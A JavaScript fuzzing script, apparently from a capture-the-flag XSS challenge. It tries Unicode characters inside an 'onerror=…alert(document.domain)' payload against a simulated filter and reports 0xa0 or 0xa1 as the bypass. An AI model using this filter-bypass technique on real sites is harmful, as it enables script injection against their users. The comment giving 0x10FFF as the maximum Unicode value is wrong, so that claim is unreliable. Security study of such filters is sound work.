// just helper to make console slow enough for humans
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// credits to liveoverflow for the idea of fuzzing**************************
// trys every unicode input in a payload
// on successful XSS, alert box will pause function
//
// improvements:
//    -make payload array of chars, so insertion
//      point isnt manual
//    -detect alert box and click through
//    -only log in successful xss to console
//    -i found %c2%a0 works, but console log showed %a0. console is logging
//      unicode-8 which is wrong, need to make output unicode 16
var the_integer = 0;
var time_to_sleep = 100;
while(the_integer < 0x10FFF){ // 0x10FFF is max representable unicode
	try{ // must use in case decodeURI fails
		// craft payload and insert payload
		the_unicode = String.fromCodePoint(the_integer);
		the_payload = "onerror="+the_unicode+"alert(document.domain)";
		location.hash = the_payload;

		// extract payload
		the_payload =location.hash.substr(1)
		the_payload=decodeURI(the_payload);

		// start simulate xxsFilter ---------------------------------------------
		the_payload=the_payload.replace(
				/[\x00-\x27\x2a-\x2d\x2f-\x3c\x3e-\x40\x5b-\x60\x7b-\x7f]+/g,"");
		the_payload=the_payload.replace(
				/[\u2028\u2029]+/g,"");
		try{
			if((the_payload.match(/=/g).length)>1 || 
					the_payload.match(/[()]/g).length>2){
				the_payload=":("
			}
		}catch{}
		the_payload=the_payload.replace(/(on\w+)=(\w+)/ig,"");
		// end simulate xxsFilter ---------------------------------------------

		// insert junk into DOM
		result.innerHTML="<img src=x "+the_payload+">"
		ta.innerText=the_payload
		console.log("Delivered: 0x"+the_integer.toString(16)+": " + 
				the_payload + " made from the integer: " + the_integer);
		console.log("Actual: " + result.innerHTML);
	}catch{}

	await sleep(time_to_sleep);
	the_integer++;

}
console.log("ENDED")

0xa0 or 0xa1
